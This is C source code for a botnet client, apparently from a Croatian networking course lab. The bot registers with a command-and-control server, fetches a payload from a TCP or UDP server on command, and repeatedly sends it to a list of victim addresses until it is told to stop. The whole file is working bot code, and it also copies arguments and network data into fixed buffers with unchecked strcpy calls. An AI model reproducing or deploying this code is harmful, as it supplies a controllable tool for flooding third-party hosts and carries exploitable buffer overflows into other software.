#include<err.h>
#include<string.h>
#include<stdio.h>
#include<stdlib.h>
#include<netdb.h>
#include<arpa/inet.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<unistd.h>
#include<netinet/in.h>
#include<errno.h>
#include "bot.h"

#define PROG_TCP '1'
#define PROG_UDP '2'
#define RUN '3'
#define STOP '4'
#define QUIT '0'

#define MAX_MESSAGE_LENGTH 512
#define MAX_PAIRS 20


int Socket(int family, int type, int protocol){
		int succ=socket(family, type, protocol);
		char *error;
		if(succ < 0){
				error=strerror(errno);
				printf("%s\n", error);
		} 
		return succ;
		
}

int Bind(int sockfd, const struct sockaddr *myaddr, int addrlen){
	char *error;
	int err;
	err=bind(sockfd, myaddr, addrlen);
	if(err!=0){
		error=strerror(errno);
		printf("%s\n", error);
		exit(4);
	}else{
		return 0;
	}
}

int Getaddrinfo(const char *host, const char *server, const struct addrinfo *hints,
				struct addrinfo **res){
		int succ=getaddrinfo(host, server, hints, res);
		char *error;
		if(succ){
			error=strerror(errno);
			printf("%s\n", error);	
		}
		return succ;
		
}

int Sendto(int sockfd, void *buff, size_t nbytes, int flags, const struct sockaddr* to, socklen_t addrlen){
		int succ=sendto(sockfd, buff, nbytes, flags, to, addrlen);
		if(succ!=nbytes){
				printf("sendto error %d, nbytes is %d errno %d\n", succ, nbytes, errno);
				errx(2, "%s", strerror(errno));
		}
		return succ;
}	

int Recvfrom(int sock_fd,  message_from_cc *msg, size_t nbytes, int flags, struct sockaddr* from, socklen_t *fromaddrlen){
		int recieved = recvfrom(sock_fd, msg, nbytes, 0, NULL, 0);
		if(recieved <0){
				printf("recvfrom dod not recieve messages\n");
				exit(2);
		}
		return recieved;
}

int RecvfromChar(int sock_fd,  char *msg, size_t nbytes, int flags, struct sockaddr* from, socklen_t *fromaddrlen){
		int recieved = recvfrom(sock_fd, msg, nbytes, 0, NULL, 0);
		if(recieved <0){
				printf("recvfrom dod not recieve messages\n");
				exit(2);
		}
		return recieved;
}


ssize_t Write(int fd, const void *vptr, size_t n){
		size_t num_left;
		ssize_t num_written;
		const char *ptr;
		
		ptr=vptr;
		num_left=n;
		
		while(num_left>0){
				if((num_written=write(fd, ptr, num_left))<=0){
						if(num_written < 0 && errno == EINTR){
								num_written=0;
						}
						else return -1;
				}
				
				num_left-=num_written;
				ptr+=num_written;
		}
		
		return n;
}


int main(int argc, char *argv[]){
	
		int cc_sockfd, zrtve_sockfd, udp_sockfd;
		int port;
		int stop=0;
		const int on=1;
		
		struct sockaddr_in myaddr; 
		struct addrinfo hints, *res;
		
		char pom_payload[1024];
		char payload_recieved[1024];
		char portnum[10]="1234";
		char iphost[20];
		
		if(argc!=3){
				printf("Usage: ./bot ip port\n");
				exit(-1);
		}
		strcpy(portnum, argv[2]);
		strcpy(iphost, argv[1]);
		
		port=atoi(portnum);
		if(port==0){
				struct servent *serv = getservbyname(portnum, "udp");
				int pnum=htons(serv->s_port);
				port=pnum;
				printf("service port: %d\n", pnum);
		}else{
				//htons(port);
		}
		//fali i provjeriti za hostname?
		
		memset(&hints, 0, sizeof(hints));
		
		hints.ai_family=AF_INET;
		hints.ai_socktype=SOCK_DGRAM;
		hints.ai_flags=AI_PASSIVE;
		
		myaddr.sin_port=htons(port);
		myaddr.sin_family=AF_INET;
		myaddr.sin_addr.s_addr=INADDR_ANY;
		
		memset(myaddr.sin_zero, '\0', sizeof(myaddr.sin_zero));
		
		Getaddrinfo(argv[1], argv[2], &hints, &res);
		
		cc_sockfd = Socket(res->ai_family, res->ai_socktype, res->ai_protocol);
		zrtve_sockfd = Socket(PF_INET, SOCK_DGRAM, 0);
		
		struct timeval cekaj={0,500000};

		struct sockaddr_in res2;
		memcpy(&res2, res->ai_addr, sizeof(res2));
			
		printf("getting ready to send...\n");
		//salji podatak REG\n na adresu koja je upisana u resultu
		Sendto(cc_sockfd, "REG\n", strlen("REG\n"), 0, (struct sockaddr*) &res2, sizeof(struct sockaddr_in));
		printf("sending...\n");
		while(1){
				printf("waiting on command\n");
				int pairs, recieved, command;
				message_from_cc msg;
							
				//cekaj na komandu od cc-a
				recieved = Recvfrom(cc_sockfd, &msg, sizeof(message_from_cc), 0, NULL, 0);
				printf("Command %c\n", msg.command);
				
				recieved--;
				
				//koliko parova adresa je primljeno
				recieved=recieved/sizeof(addresses_from_cc);
				
				pairs=recieved;
				//printf("Pairs recieved: %d\n", pairs);
				command=msg.command;
				
				if(command == PROG_TCP){
						struct addrinfo hints, *res;
						struct sockaddr_in server_addr;
						int bytes_recieved;
						int tcp_port2;
						
						int tcp_socket=Socket(AF_INET, SOCK_STREAM, 0);
						
						memset(&hints, 0, sizeof(hints));
						hints.ai_family=AF_INET;
						hints.ai_flags |= AI_CANONNAME;
						hints.ai_socktype=SOCK_STREAM;
						
						addresses_from_cc tcpserver=msg.pairs[0];
						
						Getaddrinfo(NULL, tcpserver.port, &hints, &res);
						
						sscanf(tcpserver.port, "%d", &tcp_port2);
						
						server_addr.sin_addr=((struct sockaddr_in *)res->ai_addr)->sin_addr;
						server_addr.sin_family=AF_INET;
						server_addr.sin_port=htons(tcp_port2);
						memset(server_addr.sin_zero, '\0', sizeof(server_addr.sin_zero));
						printf("trying to connect\n");
						if(connect(tcp_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1){
								printf("can not connect\n");
								exit(1);
						}
						printf("connected...\n");
						//sleep(5);
						
						char buff[1024];
						memset(buff, 0, sizeof(buff));
						strcpy(buff, "HELLO\n");
						if(Write(tcp_socket, (void*)&buff, sizeof(buff))!=sizeof(buff)){
								printf("could not write succ\n");
								exit(1);
						}
						
						memset(buff, '\0', sizeof(buff));
						
						bzero(buff, sizeof(buff));
						int nread=0;
								while(1){
									int bytes = read(tcp_socket, (void*) (buff+nread), sizeof(buff));
									printf("Bytes read: %d\n", bytes);
									if(bytes<0){
											printf("error reading from TCP socket\n");
											close(tcp_socket);
											break;
									}
									if(bytes==0){
										close(tcp_socket);
										break;
									}
									nread+=bytes;
									
									if(buff[nread-1] =='\n' || buff[nread-1] =='\0') break;
								}
						
						strcpy(payload_recieved, buff);
						printf("Payload from server is: %s", payload_recieved);

						close(tcp_socket);
						printf("closed tcp socket\n");
						
				} else if(command == PROG_UDP){
						
						//======================
						struct addrinfo hints, *res;
						char payload[1024];
						int bytes_recieved;
						int udp_socket=Socket(AF_INET, SOCK_DGRAM, 0);

						memset(&hints, 0, sizeof(hints));
						hints.ai_family=PF_INET;
						hints.ai_socktype=SOCK_DGRAM;
						hints.ai_flags=AI_PASSIVE;
						
						addresses_from_cc udpserver=msg.pairs[0];
						
						Getaddrinfo(NULL, udpserver.port, &hints, &res);
						
						struct sockaddr_in res2;
						memcpy(&res2, res->ai_addr, sizeof(res2));
						Sendto(udp_socket, "HELLO\n", strlen("HELLO\n"), 0, (struct sockaddr*) &res2, sizeof(struct sockaddr_in));
						
						bytes_recieved = RecvfromChar(udp_socket, payload, sizeof(payload), 0, NULL, 0);
						strcpy(payload_recieved, payload);
						printf("Payload from server is: %s", payload_recieved);
						close(udp_socket);
						printf("Closed udp socket\n");
				}else if(command == RUN){
						cekaj.tv_usec=500000;
						setsockopt(cc_sockfd, SOL_SOCKET, SO_RCVTIMEO, &cekaj, sizeof(struct timeval));
						setsockopt(zrtve_sockfd, SOL_SOCKET, SO_RCVTIMEO, &cekaj, sizeof(struct timeval));
						setsockopt(cc_sockfd, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on)); //dozvoli BROADCAST adrese

						int sent, pair;
						strcpy(pom_payload, payload_recieved);
						char *p;
						char pay1[1024];
						
						for(sent=0; sent<4; ++sent){
							
							p=strtok(payload_recieved, ":");
							while(p!=NULL){
								char zrtva[100];

								strcpy(pay1, p);
								if (strcmp(pay1, "\n")==0) {
										printf("imamo backslash n\n");
										break;
								}
								recieved = recvfrom(cc_sockfd, &msg, sizeof(message_from_cc), 0, NULL, 0);
								if(recieved>0){
											command=msg.command;
											if(command==STOP){
												printf("stop sending\n");
												stop=1;
												break;	
										}
								}
								recieved = recvfrom(zrtve_sockfd, &zrtva, sizeof(zrtva), 0, NULL, 0);
								if(recieved>0){
										printf("zrtva je poslala\n");
										stop=1;
										break;
								}
								for(pair=0; pair<pairs; pair++){
											struct addrinfo hints, *res;
											addresses_from_cc to; 
											
											memset(&hints, 0, sizeof(hints));
											hints.ai_family=PF_INET;
											hints.ai_socktype=SOCK_DGRAM;
											hints.ai_flags=AI_PASSIVE;
											
											to = msg.pairs[pair];
											Getaddrinfo(to.ip, to.port, &hints, &res);
											struct sockaddr_in res2;
											memcpy(&res2, res->ai_addr, sizeof(res2));
											
											
											Sendto(zrtve_sockfd, pay1, strlen(pay1), 0, (struct sockaddr*) &res2, sizeof(struct sockaddr_in));
											
								}
								if(stop==1) {
									break;
								}
								printf("bot sent payload %s to all victims\n", pay1);
								p=strtok(NULL, ":");
							}
							if(stop==1) {
									break;
							}
							strcpy(payload_recieved, pom_payload);

					}	
					printf("done\n");
					stop=0;
					cekaj.tv_usec=0;
					setsockopt(cc_sockfd, SOL_SOCKET, SO_RCVTIMEO, &cekaj, sizeof(struct timeval));

					strcpy(payload_recieved, pom_payload);
						
				} else if (command==STOP){
						printf("stop sending payload to victims\n");
				} else if(command==QUIT){
						//printf("quit");
						exit(0);
				} else {
					printf("invalid command\n");
					exit(2);
					}
		}
		return 0;
}
